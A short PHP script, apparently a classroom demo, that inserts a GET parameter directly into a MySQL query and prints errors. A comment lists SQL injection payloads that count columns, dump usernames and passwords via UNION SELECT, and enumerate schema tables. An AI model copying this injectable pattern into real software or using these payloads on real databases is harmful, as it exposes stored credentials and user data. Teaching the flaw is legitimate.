<?php

$mysqli = new mysqli('localhost', 'stud3user', '2222', 'stud3');

//print_r($_GET);
$query = "SELECT `id`, `lastname`, `firstname` FROM `students` WHERE `age` > '".$_GET['age']."' LIMIT 15";

echo "Query to be executed: ".$query."<hr>";

$res = $mysqli->query($query);
if( $res === false ) {
//    echo json_encode([]); die();
    echo $mysqli->error."<br>";
    die('bad request');
}
if( $res->num_rows ) {
    $data = $res->fetch_all(MYSQLI_ASSOC);
//    echo json_encode($data);
    echo "students data: <br><pre>";
    print_r($data);
    echo "";
}
else {
    echo "No students found<br>";
}

/*
 * possible age values - from example:
25' ORDER BY 1 #
25' ORDER BY 4 #
30' UNION SELECT uid as id, `username` as lastname, `password` as firstname FROM `users` ORDER BY id #
30' UNION SELECT table_name, 1, 2 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=database() #
30' UNION SELECT `COLUMN_NAME`, `ORDINAL_POSITION`, `DATA_TYPE` FROM INFORMATION_SCHEMA.`COLUMNS` WHERE `TABLE_SCHEMA`=database() AND `TABLE_NAME` LIKE 'users' #
*/